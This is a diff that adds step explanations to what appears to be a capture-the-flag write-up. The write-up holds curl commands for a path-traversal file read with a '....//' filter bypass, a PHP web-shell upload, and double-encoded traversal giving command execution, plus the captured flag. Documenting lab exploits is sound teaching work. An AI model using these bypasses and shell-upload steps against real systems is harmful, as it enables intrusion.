@@ -85,6 +85,7 @@ curl -sk "http://154.57.164.83:31252/api/image.php?p=....//....//....//....//...
 # Read contact.php to find execute sink:
 curl -sk "http://154.57.164.83:31252/api/image.php?p=....//....//....//....//....//var/www/html/contact.php"
 ```
+> Uses the read-only LFI in `image.php` with the `....//` bypass to retrieve PHP source files. The `file_get_contents` sink returns raw bytes so you get the source code directly instead of executing it.
 
 ### Step 2 — Upload PHP shell
 
@@ -98,6 +99,7 @@ curl -sk -X POST "http://154.57.164.83:31252/api/application.php" \
   -F "file=@/tmp/sh.php;filename=sh.php"
 # Stored at: /var/www/html/uploads/2fa910a7da2a26e8eb8fefb712150cd0.php
 ```
+> Creates a PHP web shell, computes its MD5 hash locally to predict the upload path, then submits it as a job application file. The server stores it at `/uploads/<md5>.php` — a path you now know exactly.
 
 ### Step 3 — RCE via double-encoded contact.php LFI
 
@@ -120,6 +122,7 @@ REGION="%252e%252e%252fuploads%252f${SHELL_MD5}"
 curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=id"
 # → uid=33(www-data) gid=33(www-data)
 ```
+> Double-encodes the path traversal so nginx decodes `%25` to `%` before PHP sees it, leaving `%2e%2e%2f` which the filter does not block. Then PHP's `urldecode()` decodes again to `../`, making the path resolve to the uploaded shell.
 
 ### Step 4 — Find + read flag
 
@@ -132,6 +135,7 @@ curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=ls+%2F"
 curl -sk "http://154.57.164.83:31252/contact.php?region=${REGION}&c=cat+%2Fflag_09ebca.txt"
 # → eedbb78d4800aa45573840ed6bd2d1e3
 ```
+> Lists the root directory to find the randomized flag filename, then reads it. The `%2F` is a URL-encoded `/` so the shell command `ls /` reaches the target without being caught by the filter.
 
 **Flag:** `eedbb78d4800aa45573840ed6bd2d1e3`
 
